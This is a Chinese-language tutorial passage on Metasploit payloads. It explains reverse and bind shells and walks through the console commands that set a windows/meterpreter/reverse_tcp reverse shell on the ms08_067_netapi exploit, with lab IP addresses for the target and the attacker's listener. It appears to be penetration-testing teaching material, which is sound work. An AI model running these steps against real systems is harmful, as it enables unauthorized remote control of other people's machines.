攻击载荷是用户希望目标系统在被渗透攻击之后去执行的代码。在Metasploit框架中，可以自由地选择、传送和植入载荷。例如，反弹式Shell是一种从目标主机到攻击主机创建网络连接，并提供命令进行Shell的攻击载荷。而Bind Shell攻击载荷则在目标主机上将命令行Shell绑定到一个打开的监听端口，攻击者可以连接这些端口来取得Shell交互。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加账号等。


1、查看攻击载荷


在Metasploit框架中，提供了大量可用来进一步控制目标主机的攻击载荷。在选择攻击载荷时，用户可以使用show payloads命令查看所有可用的攻击载荷。具体如下：

2、设置攻击载荷


本例中选择windows/meterpreter/reverse_tcp攻击载荷，用于获取一个反弹式Shell。其语法格式如下：


set payload [攻击载荷]


此时，执行命令如下：


msf5 exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp

payload => windows/meterpreter/reverse_tcp


从输出的信息中可以看到，已设置payload为windows/meterpreter/reverse_tcp。当成功加载攻击载荷后，执行show options命令会看到增加了一部分Payload options（攻击载荷选项）配置内容。具体如下：

3、设置攻击载荷选项


当用户加载一个攻击载荷后，可以看到该攻击载荷也有需要进行配置的选项参数。而且必须配置这些选项，才可使其攻击载荷发挥作用。所有攻击载荷都有相应的配置选项，并且每个攻击载荷的配置选项设置方法都相同。通常，攻击载荷选项包括渗透攻击的IP地址和端口。


设置攻击载荷选项。


1）查看攻击载荷中可配置的选项。执行命令如下：


msf5 exploit(ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi): #模块选项

Name     Current Setting   Required     Description

------   ---------------  ---------    ------------

RHOSTS 192.168.1.104 yes The target address range or CIDR identifier

RPORT   445  yes  The SMB service port (TCP)

SMBPIPE  BROWSER  yes  The pipe name to use (BROWSER,SRVSVC)

Payload options (windows/meterpreter/reverse_tcp):  #攻击载荷选项

Name   Current Setting  Required  Description

------   ---------------  ---------    ------------

EXITFUNC  thread  yes  Exit technique (Accepted: '', seh,thread, process, none)

LHOST  yes  The listen address

LPORT  4444  yes  The listen port

Exploit target:  #可利用目标

Id  Name

--  -----------------------------------------------

2   Windows XP SP0/SP1 Universal


从以上输出的信息中可以看到，windows/meterpreter/reverse_tcp攻击载荷共有3个可配置选项，分别是EXITFUNC（退出操作）、LHOST（监听地址）和LPORT（监听端口号）。该攻击载荷默认配置了EXITFUNC和LPORT选项，还需要配置LHOST选项。


2）配置LHOST选项，即攻击主机的IP地址。本例中，攻击主机的IP地址为192.168.1.105。执行命令如下：


msf5 exploit(ms08_067_netapi) > set LHOST 192.168.1.105

LHOST => 192.168.1.105


从输出的信息中可以看到，LHOST已经设置为192.168.1.105。
